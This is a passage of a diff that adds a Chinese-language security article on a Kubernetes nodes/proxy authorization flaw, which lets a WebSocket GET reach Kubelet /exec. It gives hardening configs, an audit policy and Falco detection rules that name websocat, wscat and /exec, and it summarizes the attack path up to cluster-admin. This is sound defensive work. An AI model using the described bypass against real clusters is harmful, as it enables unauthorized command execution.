+<span class="w">  </span><span class="c1"># 仅允许读取 metrics (不需要 /exec 权限)</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;nodes/metrics&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="c1"># 仅允许读取统计信息</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;nodes/stats&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="c1"># 仅允许读取日志</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;nodes/log&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="c1"># 仅允许读取 Pod 列表</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;nodes/pods&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="c1"># 注意: 不包含 nodes/proxy!</span>
+<span class="w">  </span><span class="c1"># 注意: 不包含 nodes/exec!</span>
+</code></pre></div>
+
+<h3>6.3 Kubelet 配置加固</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Kubelet 配置加固</span>
+<span class="c1"># /var/lib/kubelet/config.yaml</span>
+
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kubelet.config.k8s.io/v1beta1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">KubeletConfiguration</span>
+
+<span class="c1"># 强制认证</span>
+<span class="nt">authentication</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">x509</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">clientCAFile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/etc/kubernetes/pki/ca.crt</span>
+<span class="w">  </span><span class="nt">webhook</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span><span class="w">  </span><span class="c1"># 强制 webhook 认证 (RBAC 检查)</span>
+<span class="w">  </span><span class="nt">anonymous</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span><span class="w">  </span><span class="c1"># 禁止匿名访问</span>
+
+<span class="c1"># 强制授权</span>
+<span class="nt">authorization</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Webhook</span><span class="w">  </span><span class="c1"># 强制使用 RBAC 授权</span>
+
+<span class="c1"># 限制只读端口 (10255)</span>
+<span class="nt">readOnlyPort</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0</span><span class="w">  </span><span class="c1"># 禁用只读端口</span>
+
+<span class="c1"># 限制访问</span>
+<span class="nt">streamingConnectionIdleTimeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5m</span><span class="w">  </span><span class="c1"># 空闲连接超时</span>
+</code></pre></div>
+
+<h3>6.4 运行时检测</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Falco 规则: 检测直接连接 Kubelet 10250 端口</span>
+
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">macro</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kubelet_port</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">fd.sport=10250 or fd.dport=10250</span>
+
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">macro</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kube_apiserver_ip</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">(fd.sip in (k8s_apiserver_ip) or fd.dip in (k8s_apiserver_ip))</span>
+
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Direct Connection to Kubelet API</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Detects a pod making a direct connection to the Kubelet API</span>
+<span class="w">    </span><span class="no">on port 10250, bypassing the API Server. This could indicate</span>
+<span class="w">    </span><span class="no">exploitation of the nodes/proxy GET authorization blind spot.</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">outbound and container and</span>
+<span class="w">    </span><span class="no">fd.dport=10250 and</span>
+<span class="w">    </span><span class="no">not kube_apiserver_ip and</span>
+<span class="w">    </span><span class="no">not proc.name in (kubelet, kube-proxy, kube-apiserver)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Direct connection to Kubelet API detected</span>
+<span class="w">    </span><span class="no">(container=%container.name image=%container.image.repository</span>
+<span class="w">     </span><span class="no">proc=%proc.name dest=%fd.dip:10250 namespace=%k8s.ns.name)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">k8s</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">privilege_escalation</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">nodes_proxy</span><span class="p p-Indicator">]</span>
+
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WebSocket Connection to Kubelet Exec</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Detects a WebSocket connection to the Kubelet /exec endpoint,</span>
+<span class="w">    </span><span class="no">which could indicate exploitation of the nodes/proxy GET bypass.</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">outbound and container and</span>
+<span class="w">    </span><span class="no">fd.dport=10250 and</span>
+<span class="w">    </span><span class="no">(proc.cmdline contains &quot;websocat&quot; or</span>
+<span class="w">     </span><span class="no">proc.cmdline contains &quot;wscat&quot; or</span>
+<span class="w">     </span><span class="no">proc.cmdline contains &quot;websocket&quot; or</span>
+<span class="w">     </span><span class="no">proc.cmdline contains &quot;/exec/&quot;)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">WebSocket connection to Kubelet /exec detected</span>
+<span class="w">    </span><span class="no">(container=%container.name proc=%proc.name</span>
+<span class="w">     </span><span class="no">cmdline=%proc.cmdline dest=%fd.dip:10250)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">k8s</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">privilege_escalation</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">nodes_proxy</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">rce</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>6.5 K8s Audit Policy 加固</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># audit-policy.yaml — 增强审计策略</span>
+
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">audit.k8s.io/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Policy</span>
+<span class="nt">rules</span><span class="p">:</span>
+<span class="w">  </span><span class="c1"># 记录所有对 nodes/proxy 的访问</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">RequestResponse</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">group</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;&quot;</span>
+<span class="w">        </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;nodes/proxy&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;create&quot;</span><span class="p p-Indicator">]</span>
+
+<span class="w">  </span><span class="c1"># 记录所有 subjectaccessreviews (检测授权探测)</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">RequestResponse</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">group</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;authorization.k8s.io&quot;</span>
+<span class="w">        </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;selfsubjectrulesreviews&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;subjectaccessreviews&quot;</span><span class="p p-Indicator">]</span>
+
+<span class="w">  </span><span class="c1"># 记录所有 secrets 访问</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">RequestResponse</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">group</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;&quot;</span>
+<span class="w">        </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;secrets&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;list&quot;</span><span class="p p-Indicator">]</span>
+
+<span class="w">  </span><span class="c1"># 记录特权 Pod 创建</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">RequestResponse</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">group</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;&quot;</span>
+<span class="w">        </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;pods&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;create&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">namespaces</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;kube-system&quot;</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<hr />
+<h2>7. KEP-2862 与长期方案</h2>
+<h3>7.1 KEP-2862: Fine-Grained Kubelet API Authorization</h3>
+<p>Kubernetes 官方的长期解决方案是 KEP-2862，为监控组件提供细粒度子资源：</p>
+<table>
+<thead>
+<tr>
+<th>新子资源</th>
+<th>替代 nodes/proxy 的功能</th>
+<th>需要 CREATE?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nodes/metrics</td>
+<td>读取 /metrics</td>
+<td>否 (GET)</td>
+</tr>
+<tr>
+<td>nodes/stats</td>
+<td>读取 /stats/summary</td>
+<td>否 (GET)</td>
+</tr>
+<tr>
+<td>nodes/log</td>
+<td>读取 /containerLogs</td>
+<td>否 (GET)</td>
+</tr>
+<tr>
+<td>nodes/pods</td>
+<td>读取 /pods</td>
+<td>否 (GET)</td>
+</tr>
+<tr>
+<td>nodes/exec</td>
+<td>执行命令</td>
+<td><strong>是 (CREATE)</strong></td>
+</tr>
+<tr>
+<td>nodes/run</td>
+<td>执行命令</td>
+<td><strong>是 (CREATE)</strong></td>
+</tr>
+</tbody>
+</table>
+<h3>7.2 KEP-2862 的三个遗留问题</h3>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────┐
+│<span class="w">           </span><span class="nv">KEP</span><span class="o">-</span><span class="mi">2862</span><span class="w"> </span>的三个遗留问题<span class="w">                                  </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>问题<span class="w"> </span><span class="mi">1</span>:<span class="w"> </span>时间线<span class="w">                                                   </span>│
+│<span class="w">  </span>•<span class="w"> </span>预计<span class="w"> </span><span class="mi">2026</span><span class="w"> </span>年<span class="w"> </span><span class="mi">4</span><span class="w"> </span>月在<span class="w"> </span><span class="nv">v1</span>.<span class="mi">36</span><span class="w"> </span>才到<span class="w"> </span><span class="nv">GA</span><span class="w">                              </span>│
+│<span class="w">  </span>•<span class="w"> </span>大多数集群还没升级<span class="w">                                              </span>│
+│<span class="w">  </span>•<span class="w"> </span>旧版本集群仍然暴露在攻击面下<span class="w">                                    </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>问题<span class="w"> </span><span class="mi">2</span>:<span class="w"> </span><span class="o">/</span><span class="k">exec</span><span class="w"> </span>等写操作无替代<span class="w">                                      </span>│
+│<span class="w">  </span>•<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">metrics</span>,<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">stats</span>,<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">log</span><span class="w"> </span>有细粒度替代<span class="w">             </span>│
+│<span class="w">  </span>•<span class="w"> </span>但<span class="w"> </span><span class="o">/</span><span class="k">exec</span>,<span class="w"> </span><span class="o">/</span><span class="nv">run</span>,<span class="w"> </span><span class="o">/</span><span class="nv">attach</span>,<span class="w"> </span><span class="o">/</span><span class="nv">portforward</span><span class="w"> </span>仍需<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">proxy</span><span class="w">        </span>│
+│<span class="w">  </span>•<span class="w"> </span>需要<span class="w"> </span><span class="k">exec</span><span class="w"> </span>的组件<span class="w"> </span><span class="ss">(</span>如<span class="w"> </span><span class="nv">kubectl</span><span class="w"> </span><span class="nv">debug</span><span class="ss">)</span><span class="w"> </span>仍暴露在风险下<span class="w">             </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>问题<span class="w"> </span><span class="mi">3</span>:<span class="w"> </span><span class="nv">WebSocket</span><span class="w"> </span><span class="nv">verb</span><span class="w"> </span>映射不变<span class="w">                                   </span>│
+│<span class="w">  </span>•<span class="w"> </span><span class="nv">KEP</span><span class="o">-</span><span class="mi">2862</span><span class="w"> </span>不改变<span class="w"> </span><span class="nv">WebSocket</span><span class="w"> </span>的<span class="w"> </span><span class="nv">GET</span><span class="w"> </span>→<span class="w"> </span><span class="nv">GET</span><span class="w"> </span>映射行为<span class="w">                </span>│
+│<span class="w">  </span>•<span class="w"> </span>监控组件不再需要<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">proxy</span><span class="w"> </span><span class="ss">(</span>问题缓解<span class="ss">)</span><span class="w">                        </span>│
+│<span class="w">  </span>•<span class="w"> </span>但需要<span class="w"> </span><span class="k">exec</span><span class="w"> </span>的组件仍可通过<span class="w"> </span><span class="nv">WebSocket</span><span class="w"> </span>绕过<span class="w">                      </span>│
+│<span class="w">  </span>•<span class="w"> </span>攻击面缩小但不消失<span class="w">                                              </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>结论:<span class="w"> </span>这个攻击面在可预见的未来不会完全消失<span class="w">                        </span>│
+└──────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<hr />
+<h2>8. 总结</h2>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>关键信息</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>漏洞性质</td>
+<td>RBAC 授权设计缺陷（非内存破坏），官方 Won't Fix</td>
+</tr>
+<tr>
+<td>所需权限</td>
+<td>仅 <code>nodes/proxy</code> GET（几乎所有监控组件都有）</td>
+</tr>
+<tr>
+<td>攻击路径</td>
+<td>WebSocket GET 握手绕过 CREATE 检查 → Kubelet /exec</td>
+</tr>
+<tr>
+<td>攻击结果</td>
+<td>集群内任意 Pod 命令执行 → 集群管理员</td>
+</tr>
+<tr>
+<td>审计盲区</td>
+<td>直连 Kubelet 不记录命令内容，仅记录 subjectaccessreviews</td>
+</tr>
+<tr>
+<td>受影响范围</td>
+<td>69 个 Helm Chart，v1.34/v1.35 测试通过</td>
+</tr>
+<tr>
+<td>短期防御</td>
+<td>NetworkPolicy 限制 10250 + 移除非必要 nodes/proxy</td>
+</tr>
+<tr>
+<td>长期方案</td>
+<td>KEP-2862（v1.36 GA），但不完全消除攻击面</td>
+</tr>
+<tr>
+<td>核心启示</td>
+<td>"只读"权限在 Kubernetes 中不可靠，RBAC verb 语义与 HTTP method 的映射存在盲区</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Graham Helton 的原话总结</strong>："这是那种攻击者暗自庆幸、运维团队继承了好几年都不知道的'只读'权限。"</p>
+<hr />
+<blockquote>
+<p><strong>免责声明重申</strong>：本文所有漏洞分析基于公开的安全研究博客（Graham Helton 的原始披露）和 Kubernetes 官方文档。Kubernetes 官方已将此问题定性为 "Won't Fix / intended behavior"。所有代码和技术细节仅用于理解 RBAC 授权缺陷以构建防御体系。读者必须在授权的测试环境中使用相关技术，未经授权对任何系统进行渗透测试属于违法行为。作者不对任何因不当使用本文信息而造成的后果承担责任。</p>
+</blockquote>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
